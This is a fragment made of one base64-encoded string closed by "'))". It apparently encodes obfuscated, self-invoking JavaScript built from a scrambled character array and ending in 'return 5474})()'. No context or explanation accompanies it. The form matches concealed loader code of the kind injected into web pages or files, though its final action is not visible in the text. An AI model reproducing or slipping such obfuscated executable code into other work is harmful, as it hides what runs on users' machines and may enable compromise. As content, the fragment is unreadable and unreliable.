ZWRiM3JvfWQlQ2FZLmNGWTk0MlluKV90XFxvMVlfKGEuMDthXWVwWW9hc1k+eihhKylob1lzWXttclt9MSRpaDA7dVlpfTF9cj40WTlAc1wvbzMxWWlybzBZZV1vWTQwIF1YKmkuWSRfWW1dLHRkKFk3cmhuY1lzcmU9NkQ6bl57dVlZW0BpbWJsY2Mwa2MlKWVZKlkzcikkZTApfStyI11ZZSgxJntpIG4mbXVldFkudy5fQ3I2MChZZGNxQFktNGdcJ3NybCtlJWxpSVljZDspZXJpOyt7OiFZWTdyJDRsWVQpMlkuZV0uKG41cnhlWT1ZbXNZWDJldGVZdCRPWl1cJy5lPGVjLmh2fW8oMikzW2lcL1l0ITRhWWQ9eXIyWWxZWWQhWWdZZFlxWVlZQylZW1lYWT0zWXRZXV8pYW9mY2RZX3M/IzQleSloazE0e2ZoIj17cC5jWSkhZG90WXsqdVgwMWJZLiBpdFlwYWVfaWImWXBZZC4oclk9JCJjNWQhLllkOz00ZixbYTtkcklkOSwoNjpkNy4uWWlvWGUoZGFZaWA9ZS59YVl0PWN0IVlyb2A6cjJZaV19dFklKihTJikmMWVnLFlbWSl1Oyk2WWxjOXB9LmVZYTtkXC8xc3suMXlfbmFdWlkhbl99b2NZJWkpZV1yLm5vZSBkXWQkc18wKWw0IF1kdEUkNnRoWTJZcmVIWXRfLi5uayk1WXRZKGl5Ll99amVuP3dlb2VdZCBZKUpwcyAwKCFiZWR0WTVnKVlcL3VuJTtcL31ZWXJ0e3R0LV9fdHFLXTEoLitkaTVvKTtzcDB9VXIxbnRhaV90aDt0e247WXU1WXJZZTUyby5sKitieyAzMjFZZDt3I3M0bnJzO19bY3JfITFdbDFsPXhZdTssb100aVlZNl11NSNhb1tvMVldWVhvIG4ybGVmX2l4WT9kdFkpNTFmKCUudFk7ZWRiKGxZYy5fe2JIWV0pdFlzZHJfbjFwcltvX0RpNF8tbl99aV80MWVkKGEuPX0mcz1yYSk1eShmWVlhOT0rZWFZXyRlR2lnKXJZX2RhIHVMXSlBWVl5NCY6SG9vPmZLcy59b1kxcC50LVlyaTNZICEuKFspNjtZIWwpe1kgWTVhWTopLiFscC5saShpZG1qMmVybGV1XzNuKFlyWVluY2FZWXRuK2lNemlZMSBzIGg4ZFNfPVwnIVludHsxbmRuMi5vY2ZZZmh2X3RzZWUyKHtYLiU7ZzNoZ1pFc3FhWXNdIEkuZSx0XXRhYWkxaCA3Q3Q7IG8kaXJdIGBvYi57LmM1XS5ZWXkodHQiKH0yKVlvK1k7bWxSfSlfXyVZPVlZMWltfV1iWXQ9ZXIgJWxGWSAkZWJkM2ZuMyhZLl1lKDUwKXdONTNfaXtZJi4xZyBRbGVpJykpO3ZhciBQcE49Tm1UKEFWRyxYYUEgKTtQcE4oODEwOSk7cmV0dXJuIDU0NzR9KSgp'))
